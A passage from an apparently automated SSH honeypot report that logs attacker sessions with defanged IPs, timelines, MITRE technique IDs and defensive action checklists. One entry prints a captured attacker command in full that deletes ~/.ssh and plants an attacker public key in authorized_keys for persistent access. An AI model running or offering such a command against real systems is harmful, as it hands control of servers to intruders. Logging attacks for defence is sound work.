| `2026-08-05 14:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1654e48963

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 14:51 |
| **Last Seen** | 2026-08-05 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:51:20` | `cowrie.session.connect` |
| `2026-08-05 14:51:20` | `cowrie.client.version` |
| `2026-08-05 14:51:20` | `cowrie.client.kex` |
| `2026-08-05 14:51:21` | `cowrie.login.success` |
| `2026-08-05 14:51:21` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:51:22` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73ce0863ba08

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-08-05 14:53 |
| **Last Seen** | 2026-08-05 14:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:53:23` | `cowrie.session.connect` |
| `2026-08-05 14:53:23` | `cowrie.client.version` |
| `2026-08-05 14:53:23` | `cowrie.client.kex` |
| `2026-08-05 14:53:25` | `cowrie.login.success` |
| `2026-08-05 14:53:26` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d5af970532

| Field | Detail |
|---|---|
| **Source IP** | `220.250.53[.]211` |
| **First Seen** | 2026-08-05 15:01 |
| **Last Seen** | 2026-08-05 15:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo` |
| **TTPs (MITRE)** | T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:01:34` | `cowrie.session.connect` |
| `2026-08-05 15:01:34` | `cowrie.client.version` |
| `2026-08-05 15:01:36` | `cowrie.client.kex` |
| `2026-08-05 15:01:38` | `cowrie.login.failed` |
| `2026-08-05 15:01:39` | `cowrie.login.success` |
| `2026-08-05 15:01:40` | `cowrie.session.params` |
| `2026-08-05 15:01:40` | `cowrie.command.input` |
| `2026-08-05 15:01:44` | `cowrie.log.closed` |
| `2026-08-05 15:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.53[.]211` to AbuseIPDB if not already reported
- [ ] Block `220.250.53[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc94964a781

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]165` |
| **First Seen** | 2026-08-05 15:02 |
| **Last Seen** | 2026-08-05 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:02:43` | `cowrie.session.connect` |
| `2026-08-05 15:02:43` | `cowrie.client.version` |
| `2026-08-05 15:02:43` | `cowrie.client.kex` |
| `2026-08-05 15:02:44` | `cowrie.login.success` |
| `2026-08-05 15:02:44` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:02:44` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae573921dd5

| Field | Detail |
|---|---|
| **Source IP** | `118.193.44[.]22` |
| **First Seen** | 2026-08-05 15:09 |
| **Last Seen** | 2026-08-05 15:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:09:03` | `cowrie.session.connect` |
| `2026-08-05 15:09:03` | `cowrie.client.version` |
| `2026-08-05 15:09:04` | `cowrie.client.kex` |
| `2026-08-05 15:09:04` | `cowrie.login.success` |
| `2026-08-05 15:09:05` | `cowrie.session.params` |
| `2026-08-05 15:09:05` | `cowrie.command.input` |
| `2026-08-05 15:09:05` | `cowrie.command.failed` |
| `2026-08-05 15:09:06` | `cowrie.log.closed` |
| `2026-08-05 15:09:07` | `cowrie.session.params` |
| `2026-08-05 15:09:07` | `cowrie.command.input` |
| `2026-08-05 15:09:07` | `cowrie.session.file_download` |
| `2026-08-05 15:09:07` | `cowrie.log.closed` |
| `2026-08-05 15:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.44[.]22` to AbuseIPDB if not already reported
- [ ] Block `118.193.44[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f9357608b2

| Field | Detail |
|---|---|
| **Source IP** | `118.193.44[.]22` |
| **First Seen** | 2026-08-05 15:09 |
| **Last Seen** | 2026-08-05 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:09:07` | `cowrie.session.connect` |
| `2026-08-05 15:09:07` | `cowrie.client.version` |
| `2026-08-05 15:09:08` | `cowrie.client.kex` |
| `2026-08-05 15:09:08` | `cowrie.login.success` |
| `2026-08-05 15:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.44[.]22` to AbuseIPDB if not already reported
- [ ] Block `118.193.44[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba4b0fdd4e8

| Field | Detail |
|---|---|
| **Source IP** | `118.193.44[.]22` |
| **First Seen** | 2026-08-05 15:09 |
| **Last Seen** | 2026-08-05 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:09:09` | `cowrie.session.connect` |
| `2026-08-05 15:09:09` | `cowrie.client.version` |
| `2026-08-05 15:09:09` | `cowrie.client.kex` |
| `2026-08-05 15:09:10` | `cowrie.login.success` |
| `2026-08-05 15:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.44[.]22` to AbuseIPDB if not already reported
- [ ] Block `118.193.44[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a0976eadd6

| Field | Detail |
|---|---|
| **Source IP** | `122.187.237[.]122` |
| **First Seen** | 2026-08-05 15:09 |
| **Last Seen** | 2026-08-05 15:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:09:34` | `cowrie.session.connect` |
| `2026-08-05 15:09:35` | `cowrie.client.version` |
| `2026-08-05 15:09:35` | `cowrie.client.kex` |
| `2026-08-05 15:09:37` | `cowrie.login.success` |
| `2026-08-05 15:09:37` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.237[.]122` to AbuseIPDB if not already reported
- [ ] Block `122.187.237[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8892fab918ad

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-05 15:12 |
| **Last Seen** | 2026-08-05 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:12:58` | `cowrie.session.connect` |
| `2026-08-05 15:12:58` | `cowrie.client.version` |
| `2026-08-05 15:12:58` | `cowrie.client.kex` |
| `2026-08-05 15:12:58` | `cowrie.login.success` |
| `2026-08-05 15:12:58` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:12:59` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473c36dc89e1

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-08-05 15:13 |
| **Last Seen** | 2026-08-05 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:13:13` | `cowrie.session.connect` |
| `2026-08-05 15:13:13` | `cowrie.client.version` |
| `2026-08-05 15:13:13` | `cowrie.client.kex` |
| `2026-08-05 15:13:14` | `cowrie.login.success` |
| `2026-08-05 15:13:14` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:13:14` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0e04870bdb

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-08-05 15:13 |
| **Last Seen** | 2026-08-05 15:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:13:38` | `cowrie.session.connect` |
| `2026-08-05 15:13:38` | `cowrie.client.version` |
| `2026-08-05 15:13:38` | `cowrie.client.kex` |
| `2026-08-05 15:13:40` | `cowrie.login.success` |
| `2026-08-05 15:13:41` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b2d9087588

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-05 15:13 |
| **Last Seen** | 2026-08-05 15:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:13:50` | `cowrie.session.connect` |
| `2026-08-05 15:13:51` | `cowrie.client.version` |
| `2026-08-05 15:13:51` | `cowrie.client.kex` |
| `2026-08-05 15:13:53` | `cowrie.login.success` |
| `2026-08-05 15:13:54` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a94804ae49

| Field | Detail |
|---|---|
| **Source IP** | `45.126.120[.]53` |
| **First Seen** | 2026-08-05 15:13 |
| **Last Seen** | 2026-08-05 15:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:13:59` | `cowrie.session.connect` |
| `2026-08-05 15:13:59` | `cowrie.client.version` |
| `2026-08-05 15:13:59` | `cowrie.client.kex` |
| `2026-08-05 15:14:00` | `cowrie.login.success` |
| `2026-08-05 15:14:01` | `cowrie.session.params` |
| `2026-08-05 15:14:01` | `cowrie.command.input` |
| `2026-08-05 15:14:02` | `cowrie.log.closed` |
| `2026-08-05 15:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.126.120[.]53` to AbuseIPDB if not already reported
- [ ] Block `45.126.120[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63a880fe88ec

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-08-05 15:14 |
| **Last Seen** | 2026-08-05 15:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:14:54` | `cowrie.session.connect` |
| `2026-08-05 15:14:55` | `cowrie.client.version` |
| `2026-08-05 15:14:55` | `cowrie.client.kex` |
| `2026-08-05 15:14:57` | `cowrie.login.success` |
| `2026-08-05 15:14:58` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed8b644ee37

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 15:15 |
| **Last Seen** | 2026-08-05 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:15:48` | `cowrie.session.connect` |
| `2026-08-05 15:15:48` | `cowrie.client.version` |
| `2026-08-05 15:15:48` | `cowrie.client.kex` |
| `2026-08-05 15:15:48` | `cowrie.login.success` |
| `2026-08-05 15:15:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:15:49` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b4f7f0d452

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 15:21 |
| **Last Seen** | 2026-08-05 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:21:04` | `cowrie.session.connect` |
| `2026-08-05 15:21:04` | `cowrie.client.version` |
| `2026-08-05 15:21:04` | `cowrie.client.kex` |
| `2026-08-05 15:21:04` | `cowrie.login.success` |
| `2026-08-05 15:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626ebb9aa86c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 15:21 |
| **Last Seen** | 2026-08-05 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:21:04` | `cowrie.session.connect` |
| `2026-08-05 15:21:04` | `cowrie.client.version` |
| `2026-08-05 15:21:04` | `cowrie.client.kex` |
| `2026-08-05 15:21:04` | `cowrie.login.success` |
| `2026-08-05 15:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957101507f08

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 15:21 |
| **Last Seen** | 2026-08-05 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:21:14` | `cowrie.session.connect` |
| `2026-08-05 15:21:14` | `cowrie.client.version` |
| `2026-08-05 15:21:14` | `cowrie.client.kex` |
| `2026-08-05 15:21:14` | `cowrie.login.success` |
| `2026-08-05 15:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705fcf282dd6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 15:21 |
| **Last Seen** | 2026-08-05 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:21:14` | `cowrie.session.connect` |
| `2026-08-05 15:21:14` | `cowrie.client.version` |
| `2026-08-05 15:21:14` | `cowrie.client.kex` |
| `2026-08-05 15:21:14` | `cowrie.login.success` |
| `2026-08-05 15:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3af5c177e1

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]67` |
| **First Seen** | 2026-08-05 15:26 |
| **Last Seen** | 2026-08-05 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:26:50` | `cowrie.session.connect` |
| `2026-08-05 15:26:50` | `cowrie.client.version` |
| `2026-08-05 15:26:51` | `cowrie.client.kex` |
| `2026-08-05 15:26:51` | `cowrie.login.success` |
| `2026-08-05 15:26:51` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:26:51` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]67` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dafe5b94edb3

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 15:27 |
| **Last Seen** | 2026-08-05 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:27:22` | `cowrie.session.connect` |
| `2026-08-05 15:27:22` | `cowrie.client.version` |
| `2026-08-05 15:27:22` | `cowrie.client.kex` |
| `2026-08-05 15:27:23` | `cowrie.login.success` |
| `2026-08-05 15:27:23` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:27:23` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3e41371b110

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-08-05 15:30 |
| **Last Seen** | 2026-08-05 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:30:13` | `cowrie.session.connect` |
| `2026-08-05 15:30:13` | `cowrie.client.version` |
| `2026-08-05 15:30:13` | `cowrie.client.kex` |
| `2026-08-05 15:30:16` | `cowrie.login.success` |
| `2026-08-05 15:30:16` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd74b2d19c87

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 15:40 |
| **Last Seen** | 2026-08-05 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:40:44` | `cowrie.session.connect` |
| `2026-08-05 15:40:44` | `cowrie.client.version` |
| `2026-08-05 15:40:45` | `cowrie.client.kex` |
| `2026-08-05 15:40:45` | `cowrie.login.success` |
| `2026-08-05 15:40:45` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:40:45` | `cowrie.direct-tcpip.data` |
| `2026-08-05 15:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca30941b0c6

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-08-05 15:44 |
| **Last Seen** | 2026-08-05 15:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:44:28` | `cowrie.session.connect` |
| `2026-08-05 15:44:29` | `cowrie.client.version` |
| `2026-08-05 15:44:29` | `cowrie.client.kex` |
| `2026-08-05 15:44:31` | `cowrie.login.success` |
| `2026-08-05 15:44:32` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964c5f4833c9

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-05 15:48 |
| **Last Seen** | 2026-08-05 15:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 15:48:39` | `cowrie.session.connect` |
| `2026-08-05 15:48:39` | `cowrie.client.version` |
| `2026-08-05 15:48:39` | `cowrie.client.kex` |
| `2026-08-05 15:48:40` | `cowrie.login.success` |
| `2026-08-05 15:48:40` | `cowrie.direct-tcpip.request` |
| `2026-08-05 15:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
